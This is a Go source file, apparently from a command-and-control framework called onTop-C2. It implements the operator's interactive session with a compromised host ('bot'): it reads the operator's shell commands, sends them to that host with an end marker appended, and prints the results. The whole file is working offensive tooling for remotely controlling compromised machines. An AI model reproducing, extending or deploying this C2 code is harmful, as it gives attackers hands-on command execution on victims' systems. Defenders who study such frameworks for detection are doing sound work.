package session

import (
	"bufio"
	"fmt"
	"os"
	"strings"
	"time"
	"os/signal"
	"syscall"

	"github.com/Yyax13/onTop-C2/src/listener"
	"github.com/Yyax13/onTop-C2/src/misc"
)

func InteractWithSession(sessionID string, SigintChan chan struct{}) {
	var session *listener.ListenerSession
	var exists bool

	session, exists = listener.Sessions[sessionID]

	if !exists {
		misc.PanicWarn(fmt.Sprintf("Error: %v %s\n", "Not found session with id", sessionID), true)
		return

	}

	newErr := misc.ForceClearStdout()
	if newErr != nil {
		misc.PanicWarn(fmt.Sprintf("An error ocurred during stdout forced clear: %v", newErr), false)
		return

	}

	botIP, _ := misc.Colors(session.BotIP, "white")
	promptSignal, _ := misc.Colors("->", "white")
	endFromListener := "___END__OF__RESULT__IN__" + session.ID + "__" + session.BotIP + "___"

	misc.PrintBanner()
	misc.ChanInterruptHandler(SigintChan)
	stdinScanner := bufio.NewScanner(os.Stdin)

	for {
		select{
		case <- SigintChan:
			signal.Stop(misc.ChanInterruptSigs)
			signal.Notify(misc.InterruptSigs, syscall.SIGINT)
			return

		default:
			fmt.Printf("%v %v ", botIP, promptSignal)
			ok := stdinScanner.Scan()
			misc.ChanCtrlDHandler(ok, stdinScanner.Err(), SigintChan)

			userCommand := strings.TrimSpace(stdinScanner.Text())
			if userCommand == "" {
				continue

			}

			session.Commands <- userCommand + fmt.Sprintf("; echo %v", endFromListener)

			var fullResponse []string
			var finishedPrinting bool

			for !finishedPrinting {
				select{
				case output := <-session.Outputs:
					trimOutput := strings.TrimSpace(output)
					if trimOutput == endFromListener {
						finishedPrinting = true
						break

					}

					fullResponse = append(fullResponse, trimOutput)
				
				case <-time.After(25 * time.Second):
					misc.PanicWarn(fmt.Sprintf("Error: %v\n", "Timeout waiting for response"), false)
					finishedPrinting = true

				}
			
			}

			if len(fullResponse) != 0 {
				fmt.Println(strings.Join(fullResponse, "\n"))

			}

			fmt.Print("\n")

		}

	}

}
